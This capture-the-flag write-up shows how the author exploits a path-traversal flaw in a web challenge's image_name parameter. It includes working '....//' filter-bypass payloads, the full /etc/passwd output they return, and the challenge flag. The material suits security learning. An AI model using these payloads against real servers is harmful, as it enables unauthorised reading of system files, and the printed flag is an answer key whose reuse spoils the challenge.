# file-crawler

After we inspect the page source we see this:
```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <h1>File Crawler</h1>
        <style>
            h1 {text-align: center;}
            p {text-align: center;}   
        </style>
    </head>
    <body>        
        <div style="text-align: center">
            <image src="local?image_name=static/path.jpg" align="middle">
        </div>
    </body>
</html>
```

What we can observe from here that there is a file name local and it has a param named image_name that gets another file to display.
When we try to access the **url/local** we get hit with try harder. So I started thinking that we can abuse the image_name parameter. 

After playing a little with some inputs this one retunred me a non "Try harder!" message:
```javascript
/local?image_name=static/....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
```
Output:
```shell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
ctf:x:1000:1000::/home/ctf/:/bin/bash
```

Now we can see there is an user named ctf, but it is irelevant since the ctf tells us that the flag is in a temporary file (tmp). So I tried this payload:
```javascript
/local?image_name=static/....//....//....//....//....//....//....//....//....//....//....//....//tmp/flag
```

flag: `CTF{0caec419d3ad1e1f052f06bae84d9106b77d166aae899c6dbe1355d10a4ba854}`